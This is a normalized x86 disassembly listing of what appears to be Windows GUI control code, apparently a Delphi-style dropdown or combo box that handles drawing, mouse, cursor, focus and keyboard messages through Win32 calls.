mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov eax esi
call sub_403f40
cmp [ ebx + 0x2b2 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
push eax
push esi
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x2b4 ]
call [ ebx + 0x2b0 ]
sub_47a0e8
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x2c2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push ecx
lea ecx [ esp + 0x4 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2c4 ]
call [ ebx + 0x2c0 ]
sub_47a118
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x2ca ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2cc ]
call [ ebx + 0x2c8 ]
sub_47a144
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
cmp [ ebx + 0x2a2 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax ebx
mov si 0xffc8
call sub_403368
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov al [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x2a4 ]
call [ ebx + 0x2a0 ]
mov eax ebx
mov si 0xffc8
call sub_403368
test al al
je r-xdata
mov eax ebx
call sub_43f5b4
sub eax [ ebp - 0x14 ]
mov [ ebp - 0x14 ] eax
mov eax ebx
call sub_43f5b4
mov esi eax
sub esi [ ebp - 0xc ]
mov [ ebp - 0xc ] esi
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x14 ] esi
mov [ ebp - 0xc ] eax
xor edx edx
mov eax ebx
call sub_476574
mov dl 0x1
mov eax ebx
call sub_476574
sub_47a418
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47a4e8
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ esi ]
sub al 0x8
je r-xdata
lea eax [ ebx + 0x280 ]
call sub_403f40
jmp r-xdata
sub al 0x13
je r-xdata
mov edx esi
mov eax ebx
call sub_439034
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47a4ef
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
add al 0xfb
sub al 0xe0
jb r-xdata
call GetTickCount
mov edi eax
mov eax edi
sub eax [ ebx + 0x284 ]
cmp eax 0x7d0
jle r-xdata
jmp r-xdata
mov [ ebx + 0x284 ] edi
mov eax [ ebx + 0x280 ]
call sub_404200
cmp eax 0x20
jge r-xdata
lea eax [ ebx + 0x280 ]
call sub_403f40
mov eax [ ebx + 0x280 ]
call sub_404400
push eax
push 0xffff
push 0x18c
mov eax ebx
call sub_446450
push eax
call SendMessageA
mov [ esi ] 0x0
lea eax [ ebp - 0x4 ]
mov dl [ esi ]
call sub_404128
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x280 ]
call sub_404208
sub_47a4f8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x2 ] cl
mov [ ebp - 0x1 ] dl
mov esi eax
mov ebx [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
push edi
push ebx
mov cl [ ebp - 0x2 ]
mov dl [ ebp - 0x1 ]
mov eax esi
call sub_44150c
test edi edi
jl r-xdata
xor edx edx
jmp r-xdata
test ebx ebx
jl r-xdata
mov eax [ esi + 0x4 ]
mov si 0xffb2
call sub_403368
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
cmp edi [ esi + 0x48 ]
jge r-xdata
cmp ebx [ esi + 0x4c ]
jl r-xdata
mov dl 0x1
sub_47a548
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_474088
push 0x2
call GetSystemMetrics
mov [ esi + 0x248 ] eax
mov [ esi + 0x254 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax esi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_47a594
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
sub eax 0x2
push eax
push 0x2
push 0x2
lea eax [ esp + 0x10 ]
push eax
call SetRect
cmp [ ebx + 0x254 ] 0x0
je r-xdata
mov eax esp
push eax
push 0x0
push 0xb4
mov eax ebx
call sub_446450
push eax
call SendMessageA
push 0x0
push 0x0
push 0xb7
mov eax ebx
call sub_446450
push eax
call SendMessageA
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ ebx + 0x240 ]
mov si 0xffc8
call sub_403368
test al al
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov eax [ esp + 0x4 ]
push eax
mov ecx [ esp + 0x4 ]
mov edx [ ebx + 0x68 ]
mov eax ebx
call sub_444b50
mov eax [ ebx + 0x248 ]
sub eax 0x2
add [ esp ] eax
mov eax [ ebx + 0x248 ]
sub [ esp + 0x8 ] eax
jmp r-xdata
sub_47a63c
push ebp
mov ebp esp
mov ecx 0x6
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_47a7d9
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ esi + 0x25c ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47a7e0
lea eax [ ebp - 0x30 ]
mov edx 0x2
call sub_403f64
lea eax [ ebp - 0x28 ]
call sub_403f40
lea eax [ ebp - 0x24 ]
call sub_40f0a8
lea eax [ ebp - 0x14 ]
call sub_403f40
lea eax [ ebp - 0x10 ]
call sub_40f0a8
retn
mov eax [ esi + 0x250 ]
cmp eax [ esi + 0x24c ]
jne r-xdata
call GetCapture
test eax eax
je r-xdata
mov eax esi
call sub_47a8e8
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ esi + 0x250 ]
call sub_446450
push eax
call SetWindowPos
mov [ esi + 0x25c ] 0x0
mov eax esi
call sub_474760
test bl bl
je r-xdata
mov eax esi
call sub_47a8e8
mov edx [ eax ]
call [ edx + 0xcc ]
push eax
mov eax esi
call sub_47a8e8
mov eax [ eax + 0x218 ]
lea ecx [ ebp - 0x14 ]
pop edx
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x14 ]
lea eax [ ebp - 0x10 ]
call sub_413430
lea eax [ ebp - 0x10 ]
call sub_414164
test al al
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax esi
call sub_4709d0
mov edx [ ebp - 0x28 ]
lea eax [ ebp - 0x24 ]
call sub_413430
lea edx [ ebp - 0x24 ]
lea eax [ ebp - 0x10 ]
call sub_414620
je r-xdata
lea eax [ ebp - 0x10 ]
call sub_414178
test al al
je r-xdata
lea eax [ ebp - 0x2c ]
lea edx [ ebp - 0x10 ]
call sub_412384
mov eax [ ebp - 0x2c ]
push eax
xor ecx ecx
mov edx 0xc
mov eax esi
call sub_440d98
mov dl 0x1
mov eax esi
call sub_436190
mov ebx [ esi + 0x240 ]
lea eax [ ebp - 0x30 ]
lea edx [ ebp - 0x10 ]
call sub_412384
mov eax [ ebp - 0x30 ]
push eax
mov ecx [ ebx + 0x22c ]
mov edx [ ebx + 0x228 ]
mov eax ebx
mov si 0xffae
call sub_403368
sub_47a7e8
push esi
push edi
push ecx
mov [ esp ] cl
mov edi edx
mov dx [ edi ]
sub dx 0xd
je r-xdata
cmp [ eax + 0x25c ] 0x0
je r-xdata
sub dx 0xe
je r-xdata
pop edx
pop edi
pop esi
retn
test [ esp ] 0x2
jne r-xdata
sub dx 0xb
je r-xdata
cmp [ edi ] 0xd
sete dl
mov si 0xffb2
call sub_403368
mov [ edi ] 0x0
test [ esp ] 0x2
je r-xdata
sub dx 0x2
jne r-xdata
cmp [ eax + 0x25c ] 0x0
je r-xdata
mov si 0xffb0
call sub_403368
mov dl 0x1
mov si 0xffb2
call sub_403368
jmp r-xdata
mov [ edi ] 0x0
jmp r-xdata
sub_47a884
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x25f ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x262 ] 0x0
je r-xdata
mov eax ebx
call sub_47a8e8
mov eax [ eax + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg al
mov [ ebx + 0x25f ] al
mov eax ebx
call sub_47a8e8
mov eax [ eax + 0x218 ]
push eax
mov esi [ ebx + 0x240 ]
mov ecx [ esi + 0x22c ]
mov edx [ esi + 0x228 ]
mov eax [ ebx + 0x264 ]
call [ ebx + 0x260 ]
sub_47a8e8
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x24c ] 0x0
jne r-xdata
mov eax [ ebx + 0x24c ]
pop esi
pop ebx
retn
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_437c84
mov esi eax
xor edx edx
mov eax esi
call sub_43fad0
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov [ esi + 0xe4 ] ebx
mov [ esi + 0xe0 ] r-xdata
mov dl 0x1
mov eax esi
call sub_438228
mov edx 0xb
mov eax esi
call sub_438294
mov [ ebx + 0x24c ] esi
sub_47a94c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x18 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_47abbf
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x25c ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47abc6
lea eax [ ebp - 0x20 ]
call sub_403f40
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_403f64
retn
mov edx [ ebx + 0x48 ]
mov eax [ ebx + 0x250 ]
call sub_43f36c
mov eax [ ebx + 0x250 ]
cmp eax [ ebx + 0x24c ]
jne r-xdata
lea ecx [ ebp - 0x28 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_416a38
lea edx [ ebp - 0x28 ]
lea ecx [ ebp - 0x8 ]
mov eax [ ebx + 0x30 ]
call sub_43f6c8
mov edi [ ebp - 0x4 ]
mov esi edi
add esi [ ebx + 0x4c ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45de70
mov edx [ ebx + 0x250 ]
mov edx [ edx + 0x4c ]
add edx esi
cmp eax edx
jge r-xdata
mov eax ebx
mov si 0xffb1
call sub_403368
mov eax ebx
call sub_47a8e8
mov edx [ ebx + 0x70 ]
call sub_43fd50
mov eax ebx
call sub_47a8e8
mov edx [ ebx + 0x68 ]
call sub_43fca4
cmp [ ebx + 0x258 ] 0x0
jle r-xdata
push 0x51
push 0x0
push 0x0
push esi
mov eax [ ebp - 0x8 ]
push eax
push 0x0
mov eax [ ebx + 0x250 ]
call sub_446450
push eax
call SetWindowPos
mov [ ebx + 0x25c ] 0x1
mov eax ebx
call sub_474760
mov eax ebx
call sub_446450
push eax
call SetFocus
mov eax [ ebx + 0x250 ]
mov esi edi
sub esi [ eax + 0x4c ]
mov eax ebx
call sub_47a8e8
mov eax [ eax + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
mov eax ebx
call sub_47a8e8
call sub_438250
imul esi eax
add esi 0x4
push esi
mov eax ebx
call sub_47a8e8
pop edx
call sub_43f390
mov eax ebx
call sub_47a8e8
mov eax [ eax + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebx + 0x258 ]
jl r-xdata
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_4709d0
mov eax [ ebp - 0x1c ]
push eax
mov eax ebx
call sub_47a8e8
mov eax [ eax + 0x218 ]
pop edx
mov ecx [ eax ]
call [ ecx + 0x54 ]
push eax
mov eax ebx
call sub_47a8e8
pop edx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax ebx
call sub_47a8e8
or edx 0xffffffff
mov ecx [ eax ]
call [ ecx + 0xd0 ]
jmp r-xdata
mov eax ebx
call sub_47a8e8
call sub_438250
imul [ ebx + 0x258 ]
add eax 0x4
push eax
mov eax ebx
call sub_47a8e8
pop edx
call sub_43f390
jmp r-xdata
mov eax ebx
call sub_47a8e8
mov edx [ ebp - 0x10 ]
call sub_43f5cc
inc eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0xc ] 0x0
mov eax ebx
call sub_47a8e8
call sub_43f5b4
mov [ ebp - 0x10 ] eax
mov eax ebx
call sub_47a8e8
mov eax [ eax + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
lea edx [ ebp - 0x18 ]
mov eax ebx
call sub_4709d0
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
inc [ ebp - 0xc ]
dec [ ebp - 0x14 ]
jne r-xdata
mov [ ebp - 0x10 ] esi
mov eax ebx
call sub_47a8e8
mov eax [ eax + 0x218 ]
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x20 ]
push eax
mov eax ebx
call sub_47a8e8
mov eax [ eax + 0x228 ]
pop edx
call sub_42282c
mov esi eax
cmp esi [ ebp - 0x10 ]
jle r-xdata
sub_47abd0
push ebx
push esi
push ecx
mov [ esp ] cl
mov esi edx
mov ebx eax
cmp [ ebx + 0x254 ] 0x1
jne r-xdata
mov edx esi
mov cl [ esp ]
mov eax ebx
call sub_474394
cmp [ esi ] 0xd
jne r-xdata
mov al [ r-xdata ]
cmp al [ esp ]
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x108 ]
mov eax ebx
call sub_446450
mov edx 0x102
call sub_47404c
jmp r-xdata
pop edx
pop esi
pop ebx
retn
sub_47ac21
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffffe8
push esi
mov esi eax
test cl cl
jne r-xdata
pop esi
mov esp ebp
pop ebp
retn 0xc
lea ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
call sub_416a38
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
lea edx [ ebp - 0x18 ]
mov eax [ esi + 0x250 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
cmp eax 0x1
sbb edx edx
inc edx
mov eax esi
mov si 0xffb2
call sub_403368
sub_47ac74
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x2 ] cl
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0xc ]
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
push edi
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x2 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_4411ac
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp [ ebx + 0x254 ] 0x0
je r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
mov eax edi
call sub_416a38
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_47b2b0
test al al
je r-xdata
cmp [ ebx + 0x25c ] 0x0
je r-xdata
mov dl 0x1
mov eax ebx
call sub_43fde8
mov [ ebx + 0x25d ] 0x1
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax ebx
call sub_47b098
cmp [ ebx + 0x250 ] 0x0
je r-xdata
xor edx edx
mov eax ebx
mov si 0xffb2
call sub_403368
jmp r-xdata
mov eax ebx
mov si 0xffb0
call sub_403368
sub_47ad18
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
cmp [ ebx + 0x25d ] 0x0
je r-xdata
push edi
mov ecx esi
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_441464
mov ecx edi
mov edx esi
mov eax ebx
call sub_47b098
cmp [ ebx + 0x25c ] 0x0
je r-xdata
lea ecx [ ebp - 0x20 ]
mov edx edi
mov eax esi
call sub_416a38
lea edx [ ebp - 0x20 ]
lea ecx [ ebp - 0x18 ]
mov eax ebx
call sub_43f6c8
lea edx [ ebp - 0x18 ]
lea ecx [ ebp - 0x9 ]
mov eax [ ebx + 0x250 ]
call sub_43f6f4
push [ ebp - 0x5 ]
push [ ebp - 0x9 ]
lea edx [ ebp - 0x30 ]
mov eax [ ebx + 0x250 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x30 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov eax ebx
call sub_47b06c
lea eax [ ebp - 0x9 ]
call sub_406cec
mov [ ebp - 0xd ] eax
mov eax [ ebp - 0xd ]
push eax
push 0x0
push 0x201
mov eax [ ebx + 0x250 ]
call sub_446450
push eax
call SendMessageA
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_47ade0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x1 ] cl
mov ebx edx
mov esi eax
mov al [ esi + 0x25e ]
mov [ ebp - 0x2 ] al
mov eax esi
call sub_47b06c
test bl bl
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax esi
call sub_44150c
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
cmp [ esi + 0x254 ] 0x1
jne r-xdata
cmp [ ebp - 0x2 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x108 ]
sub_47ae38
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov esi edx
mov ebx eax
cmp [ ebx + 0x254 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_4441b0
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_47b260
xor edi edi
mov al [ ebx + 0x254 ]
dec al
je r-xdata
call sub_432b54
call sub_432c34
test al al
je r-xdata
dec al
jne r-xdata
cmp [ ebx + 0x25e ] 0x0
je r-xdata
cmp [ ebx + 0x25e ] 0x0
je r-xdata
mov eax [ esp + 0x10 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov eax [ esp + 0x10 ]
push eax
push esi
call ExcludeClipRect
call sub_432b54
call sub_432c34
test al al
je r-xdata
or edi 0x80f
push edi
push 0x5
lea eax [ esp + 0xc ]
push eax
push esi
call DrawEdge
mov edi 0x4000
cmp [ ebx + 0x270 ] 0x0
je r-xdata
call sub_432b54
lea ecx [ esp + 0x14 ]
mov dl 0x4
call sub_432e34
jmp r-xdata
cmp [ ebx + 0x250 ] 0x0
jne r-xdata
cmp [ ebx + 0x250 ] 0x0
jne r-xdata
push 0x42
push edi
push edi
mov eax [ esp + 0xc ]
push eax
push ebp
push esi
call PatBlt
push 0x42
push edi
push edi
mov eax [ esp + 0xc ]
push eax
mov eax edi
add eax eax
mov edx ebp
sub edx eax
push edx
push esi
call PatBlt
push 0x42
push edi
push edi
mov eax [ esp + 0xc ]
push eax
mov eax edi
add eax eax
add ebp eax
push ebp
push esi
call PatBlt
mov edi 0x1
call sub_432b54
lea ecx [ esp + 0x14 ]
mov dl 0x2
call sub_432e34
call sub_432b54
lea ecx [ esp + 0x14 ]
mov dl 0x3
call sub_432e34
jmp r-xdata
lea eax [ esp + 0x4 ]
push eax
push 0x0
call sub_432b54
lea ecx [ esp + 0x1c ]
mov edx esi
call sub_432d40
jmp r-xdata
cmp [ ebx + 0x25e ] 0x0
je r-xdata
mov edi 0x100
jmp r-xdata
cmp [ ebx + 0x25e ] 0x0
je r-xdata
call sub_432b54
lea ecx [ esp + 0x14 ]
mov dl 0x5
call sub_432eb8
jmp r-xdata
mov ebp [ esp + 0xc ]
mov eax [ esp + 0x4 ]
sub ebp eax
shr ebp 0x1
add ebp eax
dec ebp
xor edx edx
mov dl [ ebx + 0x25e ]
add ebp edx
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x8 ]
sub ecx eax
shr ecx 0x1
add ecx eax
dec ecx
add ecx edx
mov [ esp ] ecx
mov edi [ ebx + 0x248 ]
shr edi 0x3
test edi edi
jne r-xdata
or edi 0x5
push edi
push 0x3
lea eax [ esp + 0xc ]
push eax
push esi
call DrawFrameControl
jmp r-xdata
mov edi 0x4200
cmp [ ebx + 0x270 ] 0x0
je r-xdata
call sub_432b54
lea ecx [ esp + 0x14 ]
mov dl 0x4
call sub_432eb8
jmp r-xdata
lea eax [ esp + 0x4 ]
push eax
push 0x0
call sub_432b54
lea ecx [ esp + 0x1c ]
mov edx esi
call sub_432d40
jmp r-xdata
call sub_432b54
lea ecx [ esp + 0x14 ]
mov dl 0x2
call sub_432eb8
call sub_432b54
lea ecx [ esp + 0x14 ]
mov dl 0x3
call sub_432eb8
jmp r-xdata
sub_47b06c
push ebx
mov ebx eax
cmp [ ebx + 0x25d ] 0x0
je r-xdata
pop ebx
retn
or ecx 0xffffffff
or edx 0xffffffff
mov eax ebx
call sub_47b098
mov [ ebx + 0x25d ] 0x0
xor edx edx
mov eax ebx
call sub_43fde8
sub_47b098
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_47b260
lea ecx [ esp + 0x10 ]
mov edx edi
mov eax esi
call sub_416a38
push [ esp + 0x14 ]
push [ esp + 0x14 ]
lea eax [ esp + 0x8 ]
push eax
call PtInRect
cmp eax 0x1
sbb eax eax
inc eax
cmp al [ ebx + 0x25e ]
je r-xdata
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0x25e ] al
push 0x0
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_446450
push eax
call InvalidateRect
sub_47b0fc
push ebx
push esi
push edi
push ebp
mov ebp eax
xor eax eax
mov [ ebp + 0x250 ] eax
mov [ ebp + 0x25f ] 0x0
mov edi [ ebp + 0x240 ]
mov ecx [ edi + 0x22c ]
mov edx [ edi + 0x228 ]
mov eax edi
mov si 0xffab
call sub_403368
mov ebx eax
mov [ ebp + 0x254 ] bl
cmp bl 0x2
jne r-xdata
mov eax ebp
call sub_474964
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_47a8e8
mov [ ebp + 0x250 ] eax
sub_47b170
push esi
mov esi eax
mov eax [ edx + 0x8 ]
cmp esi eax
je r-xdata
pop esi
retn
cmp eax [ esi + 0x250 ]
je r-xdata
xor edx edx
mov eax esi
mov si 0xffb2
call sub_403368
sub_47b1b0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47b251
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45e2ec
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x188 ]
call sub_403f94
mov [ ebx + 0x184 ] 0x3
mov edx esi
mov eax ebx
call sub_444b14
mov eax [ ebx + 0x240 ]
call sub_446450
cmp eax [ esi + 0x4 ]
je r-xdata
mov edx esi
mov eax ebx
call sub_444b14
jmp r-xdata
xor edx edx
mov eax ebx
mov si 0xffb2
call sub_403368
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b258
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
call ActivateKeyboardLayout
sub_47b260
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ ebx + 0x240 ]
mov si 0xffc8
call sub_403368
test al al
jne r-xdata
mov eax [ ebx + 0x4c ]
push eax
push edi
mov ecx [ ebx + 0x248 ]
xor edx edx
xor eax eax
call sub_416a60
mov eax [ ebx + 0x4c ]
push eax
push edi
mov esi [ ebx + 0x48 ]
mov eax esi
sub eax [ ebx + 0x248 ]
mov ecx esi
xor edx edx
call sub_416a60
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_47b2b0
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
push [ esi + 0x4 ]
push [ esi ]
lea edx [ esp + 0x8 ]
mov eax ebx
call sub_47b260
lea eax [ esp + 0x8 ]
push eax
call PtInRect
cmp eax 0x1
sbb eax eax
inc eax
add esp 0x10
pop esi
pop ebx
retn
sub_47b2e0
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
cmp [ ebx + 0x254 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_4412d0
mov ecx esp
movsx edx [ esi + 0xa ]
movsx eax [ esi + 0x8 ]
call sub_416a38
mov edx esp
mov eax ebx
call sub_47b2b0
test al al
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
sub_47b324
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax ebx
call sub_43f6f4
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
cmp [ ebx + 0x254 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_444a00
mov edx esp
mov eax ebx
call sub_47b2b0
test al al
je r-xdata
push 0x7f00
push 0x0
call LoadCursorA
push eax
call SetCursor
jmp r-xdata
add esp 0x10
pop esi
pop ebx
retn
sub_47b388
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0x100
je r-xdata
cmp [ esi + 0x254 ] 0x2
jne r-xdata
sub eax 0x2
je r-xdata
mov edx ebx
mov eax esi
call sub_4746c8
mov eax [ ebx + 0x8 ]
call sub_457478
mov ecx eax
lea edx [ ebx + 0x4 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0x104 ]
cmp [ ebx + 0x4 ] 0x0
je r-xdata
sub eax 0x2
jne r-xdata
cmp [ esi + 0x25c ] 0x0
je r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
push eax
mov eax [ esi + 0x250 ]
call sub_446450
push eax
call SendMessageA
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_47b400
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_47b54e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x254 ] 0x0
je r-xdata
mov eax ebx
call sub_47418c
jmp r-xdata
mov eax [ ebx + 0x240 ]
cmp [ eax + 0x12a ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b555
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
cmp [ ebx + 0x254 ] 0x2
jne r-xdata
cmp [ ebx + 0x254 ] 0x1
jne r-xdata
mov eax ebx
call sub_47a8e8
cmp eax [ ebx + 0x250 ]
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x108 ]
mov eax ebx
mov si 0xffb1
call sub_403368
mov eax ebx
call sub_47a8e8
mov eax [ eax + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax ebx
call sub_47a8e8
mov edx [ eax ]
call [ edx + 0xcc ]
mov esi eax
inc esi
mov eax ebx
call sub_47a8e8
mov eax [ eax + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp esi eax
jl r-xdata
mov eax ebx
call sub_47a8e8
mov edx esi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax ebx
call sub_47a8e8
mov edx [ eax ]
call [ edx + 0xcc ]
push eax
mov eax ebx
call sub_47a8e8
mov eax [ eax + 0x218 ]
lea ecx [ ebp - 0x4 ]
pop edx
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xc
mov eax ebx
call sub_440d98
mov dl 0x1
mov eax ebx
call sub_436190
mov eax [ ebx + 0x240 ]
mov edx [ ebp - 0x4 ]
push edx
mov ecx [ eax + 0x22c ]
mov edx [ eax + 0x228 ]
mov si 0xffae
call sub_403368
mov eax ebx
call sub_436314
jmp r-xdata
xor esi esi
sub_47b55c
push ebx
mov ebx eax
mov eax ebx
call sub_441910
call sub_432b54
call sub_432c34
test al al
je r-xdata
pop ebx
retn
cmp [ ebx + 0x270 ] 0x0
jne r-xdata
mov [ ebx + 0x270 ] 0x1
mov eax ebx
call sub_474760
sub_47b590
push ebx
mov ebx eax
